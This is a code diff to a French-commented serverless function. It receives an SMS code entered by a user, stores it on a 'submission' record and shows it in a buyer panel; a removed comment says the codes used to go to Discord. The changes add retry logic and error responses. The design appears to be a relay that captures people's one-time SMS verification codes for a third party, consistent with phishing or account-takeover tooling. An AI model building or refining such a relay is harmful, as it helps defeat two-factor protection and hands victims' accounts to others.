@@ -1,21 +1,33 @@
 import { createClientFromRequest } from 'npm:@base44/sdk@0.8.31';
 
 // Réception du code SMS saisi par l'utilisateur.
-// Le code est désormais stocké sur la soumission et affiché dans le panneau
-// acheteur (/buyer) au lieu d'être envoyé sur Discord.
+// Le code est stocké sur la soumission et affiché dans le panneau acheteur (/buyer).
 Deno.serve(async (req) => {
   const base44 = createClientFromRequest(req);
   const { code, submissionId } = await req.json();
 
-  // Récupère les vraies informations de la demande en base
-  let sub = null;
-  if (submissionId) {
-    try {
-      const records = await base44.asServiceRole.entities.Submission.filter({ id: submissionId }, "-created_date", 1);
-      sub = records[0] || null;
-    } catch (e) {
-      console.error("fetch submission failed:", e.message);
+  if (!submissionId) {
+    return Response.json({ error: "ID manquant" }, { status: 400 });
+  }
+
+  // Récupère la soumission par ID — retry car la plateforme peut rate-limiter les reads.
+  const fetchSub = async () => {
+    for (let attempt = 1; attempt <= 4; attempt++) {
+      try {
+        return await base44.asServiceRole.entities.Submission.get(submissionId);
+      } catch (e) {
+        if (attempt === 4) throw e;
+        await new Promise((r) => setTimeout(r, 400 * attempt));
+      }
     }
+  };
+
+  let sub = null;
+  try {
+    sub = await fetchSub();
+  } catch (e) {
+    console.error("fetch submission failed:", e.message);
+    return Response.json({ error: "Réessaye dans un instant" }, { status: 503 });
   }
 
   // Anti-spam: ne traiter que les demandes réellement en attente de code.
@@ -31,12 +43,28 @@ Deno.serve(async (req) => {
     return Response.json({ error: "Format de code invalide" }, { status: 400 });
   }
 
-  // Stocke le code reçu sur la soumission et repasse en attente d'action acheteur.
-  await base44.asServiceRole.entities.Submission.update(submissionId, {
-    status: "pending",
-    received_code: codeStr,
-    code_received_at: new Date().toISOString(),
-  }).catch((e) => console.error("update submission failed:", e.message));
+  // Stocke le code reçu — retry car la plateforme peut rate-limiter les writes.
+  const saveCode = async () => {
+    for (let attempt = 1; attempt <= 4; attempt++) {
+      try {
+        await base44.asServiceRole.entities.Submission.update(submissionId, {
+          status: "pending",
+          received_code: codeStr,
+          code_received_at: new Date().toISOString(),
+        });
+        return;
+      } catch (e) {
+        if (attempt === 4) throw e;
+        await new Promise((r) => setTimeout(r, 400 * attempt));
+      }
+    }
+  };
+  try {
+    await saveCode();
+  } catch (e) {
+    console.error("update submission failed:", e.message);
+    return Response.json({ error: "Réessaye dans un instant" }, { status: 503 });
+  }
 
   return Response.json({ ok: true });
 });
